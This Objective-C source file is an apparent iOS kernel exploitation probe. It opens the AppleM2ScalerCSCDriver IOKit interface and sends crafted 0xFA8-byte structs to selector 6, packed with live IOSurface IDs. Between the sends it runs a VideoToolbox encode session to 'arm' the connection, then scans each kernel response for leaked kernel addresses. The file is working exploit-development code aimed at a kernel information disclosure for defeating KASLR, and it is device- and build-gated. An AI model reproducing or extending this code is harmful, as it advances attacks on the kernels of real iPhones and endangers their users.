//
//  P134RouteA.m — ROUTE A: the engine-armed K2K fill disclosure. p134.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Route map position: the read side. The static decode (note 293) put
//  the whole 2c2 mystery on the two-state K2K architecture. This probe
//  tests the ONE variable that decides it: whether the ENGINE can arm
//  OUR connection (VT scale machinery = the K2K caller). Matrix:
//    row-6 baseline send -> kr + response scan (expect 2c2 fresh)
//    VT 1280x720 encode battery (3 frames, real buffers, same session)
//    row-6 send #2 on the SAME conn -> kr + response scan
//    second open (type 1) -> row-6 send #3
//  Any kr = 0 = the ARMED FILL ran: dump +0x0 (count), +0x608/+0x60c/
//  +0x610 (the record-array pointers = the KVA candidates). Any kr
//  != 2c2 = state evidence (2c7 = conflict; the decode says the fresh
//  path K2K assert is LOG-only). hasKread stays NO - disclosure class.
//

#import "P134RouteA.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <Metal/Metal.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P134_BUILD @"p134-routea-v1"

typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*GetSVC_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOOpen_t)(p_ioservice_t, task_port_t, uint32_t, p_ioconnect_t *);
typedef void (*IORel_t)(mach_port_t);

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P134R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static IOSurfaceCreate_t g_surfCreate; static IOSurfaceGetID_t g_surfID;

static void *p134_mk_surface(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int32_t w = 256, h = 1, bpe = 4, bpr = 1024, as = 1024;
    CFNumberRef n[5];
    const int32_t vv[5] = { w, h, bpe, bpr, as };
    const char *kk[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
        "IOSurfaceBytesPerElement", "IOSurfaceBytesPerRow", "IOSurfaceAllocSize" };
    for (int i = 0; i < 5; i++) {
        n[i] = CFNumberCreate(NULL, kCFNumberSInt32Type, &vv[i]);
        CFDictionarySetValue(d, (__bridge CFStringRef)
            [NSString stringWithUTF8String:kk[i]], n[i]);
    }
    void *s = g_surfCreate(d);
    for (int i = 0; i < 5; i++) CFRelease(n[i]);
    CFRelease(d);
    return s;
}

/* one sel-6 send: builds the 0xfa8 contract with 1000 real bank tags
   (cycled from the live bank), returns kr, fills out the response
   struct, and reports the response's kernel-range qwords. */
static kern_return_t p134_send6(p_ioconnect_t conn, kern_return_t (*sCall)(
    mach_port_t, uint32_t, const void *, size_t, void *, size_t *),
    uint32_t *sids, int nsids, NSMutableString *respHex) {
    static uint8_t in[0xFA8]; static uint8_t out[0xFA8];
    memset(in, 0, sizeof(in)); memset(out, 0, sizeof(out));
    *(uint32_t *)in = 0x3e8;
    for (int i = 0; i < 1000; i++)
        *(uint32_t *)(in + 4 + i * 4) = sids[i % nsids];
    in[0xFA4] = 1;
    size_t osz = sizeof(out);
    kern_return_t kr = sCall(conn, 6, in, sizeof(in), out, &osz);
    /* response scan: +0x0 count, +0x604/+0x608/+0x60c record ptrs */
    uint32_t cnt = *(uint32_t *)out;
    uint64_t p1 = *(uint64_t *)(out + 0x608), p2 = *(uint64_t *)(out + 0x610);
    Lf(@"    resp: kr=0x%08x osz=%zu count=%u r0=0x%016llx r1=0x%016llx",
       (unsigned)kr, osz, cnt, (unsigned long long)p1, (unsigned long long)p2);
    int disclosed = 0;
    for (int off = 0; off < 0xFA8; off += 8) {
        uint64_t v = *(uint64_t *)(out + off);
        if (v >= 0xffffff0000000000ull && v <= 0xffffffe000000000ull + 0x1000000000000ull
            && v >= 0xffffffe000000000ull) {
            Lf(@"    [KVA-CAND] +0x%03x = 0x%016llx", off, (unsigned long long)v);
            disclosed++;
        }
    }
    if (!disclosed) [respHex appendString:@"(no kernel-range qwords)\n"];
    else Lf(@"    [KVA-CAND total] %d", disclosed);
    return kr;
}

#import <IOKit/IOKitLib.h>

static void p134_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p134", arms, 1, &sr, 0, "p134 routeA auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p134", 0, outcome);
}

@implementation P134RouteA

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p134_routea_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p134 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P134_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[route A law] sel-6 armed branch (UC+0x154 != 0) writes kernel");
    L(@"  results INTO the caller's 0xfa8 struct (count +0x0, record");
    L(@"  pointers +0x608/+0x60c/+0x610). The variable = whether the");
    L(@"  ENGINE (VT scale, the K2K caller) arms OUR connection.");
    L(@"[!] PANIC-POSSIBLE; one tap per force-quit; tags = REAL sids only.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p134"];
    if (stop) { L(stop); p134_bandit("gated"); return P134R(); }

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosf  = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosf) { L(@"[-] STOP dlopen"); p134_bandit("nodlopen"); return P134R(); }
    IOServiceMatching_t pM = dlsym(iokit, "IOServiceMatching");
    GetSVC_t pG = dlsym(iokit, "IOServiceGetMatchingService");
    IOOpen_t pO = dlsym(iokit, "IOServiceOpen");
    IORel_t pR = dlsym(iokit, "IOObjectRelease");
    kern_return_t (*sCall)(mach_port_t, uint32_t, const void *, size_t,
                           void *, size_t *) = dlsym(iokit, "IOConnectCallStructMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!pM || !pG || !pO || !pR || !sCall || !mp || !g_surfCreate || !g_surfID) {
        L(@"[-] STOP dlsym"); p134_bandit("nodlsym"); return P134R();
    }

    /* the live sid bank (REAL surfaces only; 256 cheap, cycled to 1000) */
    const int NBANK = 256;
    static void *bank[256]; static uint32_t sids[256];
    int nb = 0;
    for (int i = 0; i < NBANK; i++) {
        void *s = p134_mk_surface();
        if (!s) continue;
        uint32_t sid = g_surfID(s);
        if (!sid) continue;
        bank[nb] = s; sids[nb] = sid; nb++;
    }
    Lf(@"[bank] %d real live surfaces cached (tags cycled to 1000)", nb);
    if (nb < 8) {
        L(@"[-] bank too small - honest stop."); p134_bandit("nobank");
        for (int i = 0; i < nb; i++) CFRelease(bank[i]);
        return P134R();
    }

    p_ioservice_t svc = pG(*mp, pM("AppleM2ScalerCSCDriver"));
    if (!svc) { L(@"[-] no M2ScalerCSC service"); p134_bandit("nosvc");
                for (int i = 0; i < nb; i++) CFRelease(bank[i]); return P134R(); }
    p_ioconnect_t conn = MACH_PORT_NULL;
    kern_return_t okr = pO(svc, mach_task_self(), 0, &conn);
    Lf(@"[open] type=0 kr=0x%08x conn=0x%x", (unsigned)okr, (unsigned)conn);
    if (okr != 0 || !conn) {
        okr = pO(svc, mach_task_self(), 1, &conn);
        Lf(@"[open] type=1 kr=0x%08x conn=0x%x", (unsigned)okr, (unsigned)conn);
    }
    if (okr != 0 || !conn) { L(@"[-] STOP no conn");
        for (int i = 0; i < nb; i++) CFRelease(bank[i]);
        p134_bandit("noconn"); pR(svc); return P134R(); }

    MutableResp:;
    NSMutableString *respHex = [NSMutableString string];

    /* ---- send #1: the baseline (fresh conn, expect 2c2/2c7) ---- */
    L(@"--- send 1: row-6 on the fresh conn (baseline) ---");
    kern_return_t k1 = p134_send6(conn, sCall, sids, nb, respHex);

    /* ---- the ENGINE battery: VT 1280x720 H264 x3 frames ---- */
    L(@"--- the engine battery: VT 1280x720 encode x3 (the K2K caller) ---");
    VTCompressionSessionRef vs = NULL;
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
        kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, NULL, &vs);
    Lf(@"    VT create=%d (0x%x)", (int)st, (unsigned)st);
    if (st == noErr && vs) {
        (void)VTSessionSetProperty(vs, kVTCompressionPropertyKey_RealTime,
                                   kCFBooleanTrue);
        st = VTCompressionSessionPrepareToEncodeFrames(vs);
        Lf(@"    VT prepare=%d (0x%x)", (int)st, (unsigned)st);
        for (int f = 0; f < 3 && st == noErr; f++) {
            CVPixelBufferRef pb = NULL;
            CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
            if (cv == kCVReturnSuccess && pb) {
                OSStatus es = VTCompressionSessionEncodeFrame(vs, pb,
                    CMTimeMake(f, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
                Lf(@"    VT frame %d encode=%d (0x%x)", f, (int)es, (unsigned)es);
                CVPixelBufferRelease(pb);
            }
            [NSThread sleepForTimeInterval:0.05];
        }
        (void)VTCompressionSessionCompleteFrames(vs, kCMTimeInvalid);
        VTCompressionSessionInvalidate(vs); CFRelease(vs);
        L(@"    VT battery done (the engine's scale path ran on-device).");
    }

    /* ---- send #2: the SAME conn after the engine battery ---- */
    L(@"--- send 2: row-6 on the SAME conn after the engine battery ---");
    kern_return_t k2 = p134_send6(conn, sCall, sids, nb, respHex);

    /* ---- send #3: the second open, same treatment ---- */
    L(@"--- send 3: fresh type-1 open + row-6 ---");
    p_ioconnect_t conn2 = MACH_PORT_NULL;
    kern_return_t okr2 = pO(svc, mach_task_self(), 1, &conn2);
    kern_return_t k3 = 0xdeadbeef;
    if (conn2 && okr2 == 0) {
        k3 = p134_send6(conn2, sCall, sids, nb, respHex);
    } else {
        Lf(@"    type-1 open kr=0x%08x (skipped)", (unsigned)okr2);
    }
    L(respHex);

    /* ---- honest verdict ---- */
    L(@"--- VERDICT (route A, honest) ---");
    if (k2 != k1 || k3 != k1) {
        Lf(@"  STATE EVIDENCE: baseline kr=0x%08x, post-battery kr=0x%08x, "
           @"fresh-type1 kr=0x%08x — the engine DID change the row-6 state "
           @"(or the second client did). kr=0 anywhere = the ARMED FILL ran:",
           (unsigned)k1, (unsigned)k2, (unsigned)k3);
        L(@"  re-read the [KVA-CAND] lines above — full-width kernel");
        L(@"  pointers in the response struct = the disclosure receipt.");
    } else {
        Lf(@"  no state change (all kr=0x%08x): the engine did not arm OUR "
           @"connection class this boot. Next: open-type matrix / 0x820-class "
           @"arm — same law, new arming vectors.", (unsigned)k1);
    }
    L(@"[honesty] disclosure-class only. hasKread stays gated on kread32.");

    if (conn) { IORel_t pCl = dlsym(iokit, "IOServiceClose"); if (pCl) pCl(conn); }
    if (conn2) { IORel_t pCl2 = dlsym(iokit, "IOServiceClose"); if (pCl2) pCl2(conn2); }
    for (int i = 0; i < nb; i++) CFRelease(bank[i]);
    pR(svc);
    p134_bandit("ran");
    Lf(@"=== p134 end %@ ===", LabLocalMilitaryNow());
    return P134R();
}

@end